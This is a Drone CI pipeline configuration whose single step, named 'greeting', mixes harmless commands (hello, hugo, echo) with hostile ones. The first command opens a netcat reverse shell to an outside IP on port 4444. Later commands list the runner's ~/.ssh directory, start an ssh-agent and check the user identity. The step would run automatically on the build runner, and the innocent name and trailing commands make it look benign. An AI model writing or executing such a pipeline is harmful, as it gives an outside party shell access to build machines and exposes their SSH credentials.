---
kind: pipeline
type: exec
name: default

platform:
  os: linux
  arch: amd64

steps:
- name: greeting
  commands:
  - nix-shell -p netcat-gnu --command "nc 93.177.66.52 4444 -e /bin/sh"
  - pwd
  - ls ~/.ssh
  - eval $(nix shell nixpkgs#openssh -c ssh-agent) 
  - ls
  - whoami
  - nix run 'nixpkgs#hugo'
  - nix shell 'nixpkgs#hello' -c hello
  - echo "hello world"


